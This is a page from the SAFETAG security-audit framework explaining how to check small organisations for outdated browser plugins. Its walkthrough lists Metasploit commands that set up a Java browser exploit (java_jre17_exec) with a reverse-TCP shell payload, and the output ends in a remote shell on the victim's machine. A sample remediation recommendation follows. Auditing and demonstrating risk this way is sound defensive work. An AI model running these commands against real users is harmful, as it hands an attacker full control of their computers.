---
Approach:
- Technical
Authors:
- SAFETAG
Org_size_under:
- 25
Remote_options:
- with-support
Skills_required:
- N/A
Time_required_minutes:
- 30
---

#### Check Browser and Plugin Vulnerabilities

##### Summary

Though modern browsers are better at self-updating, and the prevalence of powerful plugins like flash and java are slowly declining, it is valuable to ensure that the browsers in use have updated plugins and are themselves updated.

##### Overview

##### Materials Needed

* Metasploit

##### Considerations

##### Walkthrough

###### Outdated Java browser plugins

While the threat described below is more severe if carried out by a local attacker (as they can more readily direct the victim to a malicious Web site), it also works remotely. In fact, if a user can be tricked, by a remote attacker, into clicking on a malicious email or Web link, attacks like this represent a significant perimeter threat. By compromising the victim’s machine, they can give the attacker a local point-of-presence without requiring the attacker to crack WPA keys or gain local access in some other way.

Step 1: Using Metasploit, an attacker can easily create an ad hoc malicious Web site:

```
$ msfconsole

IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt


       =[ metasploit v4.7.0-dev [core:4.7 api:1.0]
+ -- --=[ 1114 exploits - 627 auxiliary - 178 post
+ -- --=[ 307 payloads - 30 encoders - 8 nops

msf > use exploit/multi/browser/java_jre17_exec

msf exploit(java_jre17_exec) > set PAYLOAD java/shell/reverse_tcp
PAYLOAD => java/shell/reverse_tcp

msf exploit(java_jre17_exec) > set LHOST 192.168.1.123
LHOST => 192.168.1.123

msf exploit(java_jre17_exec) > set SRVPORT 8081
SRVPORT => 8081

msf exploit(java_jre17_exec) > set URIPATH java_test
URIPATH => java_test

msf exploit(java_jre17_exec) > run
[*] Exploit running as background job.
```

Step 2: At this point, any local user who visits http://192.168.1.123:8081/java_test, and who is running a sufficiently out-of-date version of the Java browser plugin, stands a good chance of giving the attacker full access to his computer:

```
[*] Started reverse handler on 192.168.1.123:4444

msf exploit(java_jre17_exec) >

[*] Using URL: http://0.0.0.0:8081/java_test
[*] Local IP: http://192.168.1.123:8081/java_test
[*] Server started.

msf exploit(java_jre17_exec) >

<remote shell>
```

Figure 1: Attacker in control of the victim’s computer through a remote command shell

##### Recommendation

**Sample Recommendation for outdated Java**

One or more of the organization’s laptops were seen to be running an outdated, known-vulnerable version of the Java plugin for Internet Explorer.

This version contains a vulnerability that is easily exploitable using one of the recent Java exploit modules from the widely available Metasploit security auditing framework. These modules allow an attacker to gain complete control over the computer of a victim who visits a malicious Web site hosted anywhere on the Internet. If the attacker is inside the office LAN, they can easily trick the victim into visiting that malicious Web site without the victim even knowing it.

At least one of the organization’s computers is running an outdated Java browser plugin, and exploit code is widely-available for several critical vulnerabilities in versions older than “Java 7, update 16.” All of the organization’s Java installations should be updated to the latest version. This can be troublesome, as (unlike the Windows operating system itself) Java plugins sometimes require user input before they will install updates.
